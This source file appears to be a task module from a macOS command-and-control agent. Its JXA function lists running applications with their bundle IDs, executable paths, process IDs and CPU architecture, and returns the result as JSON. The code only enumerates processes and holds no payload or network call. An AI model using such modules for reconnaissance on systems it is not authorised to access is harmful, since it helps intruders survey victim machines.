exports.list_apps = function(task, command, params){
    ObjC.import('AppKit');
    try{
        let names = [];
        let output = "";
        let procs = $.NSWorkspace.sharedWorkspace.runningApplications.js;
        for(let i = 0; i < procs.length; i++){
            let info = {};
            info['frontMost'] = procs[i].active;
            info['hidden'] = procs[i].hidden;
            info['bundle'] = procs[i].bundleIdentifier.js;
            info['bundleURL'] = procs[i].bundleURL.path.js;
            info['bin_path'] = procs[i].executableURL.path.js;
            info['process_id'] = procs[i].processIdentifier;
            info['name'] = procs[i].localizedName.js;
            if(procs[i].executableArchitecture == "16777223"){
                info['architecture'] = "x86_64";
            }
            else if(procs[i].executableArchitecture == "7"){
                info['architecture'] = "x86";
            }
            else if(procs[i].executableArchitecture == "18"){
                info['architecture'] = "x86_PPC";
            }
            else if(procs[i].executableArchitecture == "16777234"){
                info['architecture'] = "x86_64_PPC";
            }
            names.push(info);
        }
        return JSON.stringify({"user_output":JSON.stringify(names, null, 2), "completed": true});
    }catch(error){
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
};
COMMAND_ENDS_HERE